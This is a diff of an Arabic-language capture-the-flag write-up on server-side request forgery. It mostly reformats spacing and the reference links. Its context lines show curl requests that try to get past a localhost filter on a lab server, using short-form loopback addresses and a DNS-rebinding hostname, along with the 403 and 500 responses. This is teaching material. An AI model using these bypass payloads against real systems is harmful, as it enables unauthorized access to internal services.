@@ -539,16 +539,19 @@ $ curl http://10.10.38.70:8080/view_image -d "www=http://127.1:8080" -X POST
 <title>403 Forbidden</title>
 <h1>Forbidden</h1>
 <p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
+
 $ curl http://10.10.38.70:8080/view_image -d "www=7f000001.00000000.rbndr.us:8080" -X POST
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>500 Internal Server Error</title>
 <h1>Internal Server Error</h1>
 <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
 $ curl http://10.10.38.70:8080/view_image -d "www=http://7f000001.00000000.rbndr.us:8080" -X POST
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>403 Forbidden</title>
 <h1>Forbidden</h1>
 <p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
+
 $ curl http://10.10.38.70:8080/view_image -d "www=http://7f000001.00000000.rbndr.us:8080" -X POST -H 'Content-Type: application/x-www-form-urlencoded'
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>403 Forbidden</title>
@@ -560,6 +563,6 @@ $ curl http://10.10.38.70:8080/view_image -d "www=http://7f000001.00000000.rbndr
 في حال وجود خطأ في المقال أو إذا كان فيه طرق ثانية لحل التحدي كلمني على [Twitter](https://x.com/VulnerK0)
 
 ## المصادر
-Practice: [Portswigger](https://portswigger.net/web-security/ssrf)
-Learn more: [Owasp Top10](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
-Prevention: [Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+- Practice: [Portswigger](https://portswigger.net/web-security/ssrf)
+- Learn more: [Owasp Top10](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- Prevention: [Owasp Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
